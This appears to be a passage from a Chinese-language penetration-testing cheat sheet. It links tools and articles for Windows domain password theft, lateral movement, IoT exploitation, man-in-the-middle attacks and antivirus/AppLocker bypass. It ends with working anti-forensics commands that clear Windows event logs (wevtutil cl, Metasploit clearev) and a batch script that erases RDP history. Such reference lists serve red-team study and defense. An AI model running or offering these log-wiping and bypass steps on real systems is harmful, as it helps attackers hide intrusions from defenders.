[《域渗透——Dump Clear-Text Password after KB2871997 installed》](https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed)

[《域渗透——Hook PasswordChangeNotify》](http://www.vuln.cn/6812) 
>可通过Hook PasswordChangeNotify实时记录域控管理员的新密码 

[《域渗透——Local Administrator Password Solution》 ](http://www.liuhaihua.cn/archives/179102.html)
>域渗透时要记得留意域内主机的本地管理员账号 

[《域渗透——利用SYSVOL还原组策略中保存的密码》 ](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81)

#### 相关工具 
* [BloodHound ](https://github.com/BloodHoundAD/BloodHound)
* [CrackMapExec ](https://github.com/byt3bl33d3r/CrackMapExec)
* [DeathStar](https://github.com/byt3bl33d3r/DeathStar) 
  >利用过程：http://www.freebuf.com/sectool/160884.html 

### 在远程系统上执行程序 
* At 
* Psexec 
* WMIC 
* Wmiexec 
* Smbexec 
* Powershell remoting 
* DCOM 
* Winrm (https://github.com/Hackplayers/evil-winrm)

### IOT相关 
* 1、路由器 [routersploit ](https://github.com/reverse-shell/routersploit)
* 2、打印机 [PRET ](https://github.com/RUB-NDS/PRET)
* 3、IOT exp https://www.exploitee.rs/
* 4、相关 
[OWASP-Nettacker](https://www.owasp.org/index.php/OWASP_Nettacker)
[isf](https://github.com/dark-lbp/isf) 
[icsmaster](https://github.com/w3h/icsmaster)

### 中间人 
* [Cain](http://www.oxid.it/cain.html) 
* [Ettercap](https://github.com/Ettercap/ettercap) 
* [Responder](https://github.com/SpiderLabs/Responder) 
* [MITMf](https://github.com/byt3bl33d3r/MITMf) 
* [3r/MITMf)](https://github.com/evilsocket/bettercap) 
  
### 规避杀软及检测 
#### Bypass Applocker 
[UltimateAppLockerByPassList ](https://github.com/api0cradle/UltimateAppLockerByPassList)
https://lolbas-project.github.io/ 

#### BypassAV    
* Empire 
* PEspin 
* Shellter 
* Ebowla 
* Veil 
* PowerShell 
* Python 
* [代码注入技术Process Doppelgänging ](http://www.4hou.com/technology/9379.html)
* ...

## 痕迹清理
### [Windows日志清除](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87) 
获取日志分类列表：
```
wevtutil el >1.txt
```
获取单个日志类别的统计信息：
eg.

```
wevtutil gli "windows powershell"
```
回显：
```
creationTime: 2016-11-28T06:01:37.986Z
lastAccessTime: 2016-11-28T06:01:37.986Z
lastWriteTime: 2017-08-08T08:01:20.979Z
fileSize: 1118208
attributes: 32
numberOfLogRecords: 1228
oldestRecordNumber: 1
```
查看指定日志的具体内容：
```
wevtutil qe /f:text "windows powershell"
```
删除单个日志类别的所有信息：
```
wevtutil cl "windows powershell"
```
### 破坏Windows日志记录功能 
利用工具 
* [Invoke-Phant0m](https://github.com/hlldz/Invoke-Phant0m) 
* [Windwos-EventLog-Bypass](https://github.com/3gstudent/Windwos-EventLog-Bypass) 

### Metasploit 
```
run clearlogs 
```
```
clearev 
```
### 3389登陆记录清除 
```
@echo off
@reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
@del "%USERPROFILE%\My Documents\Default.rdp" /a
@exit
```
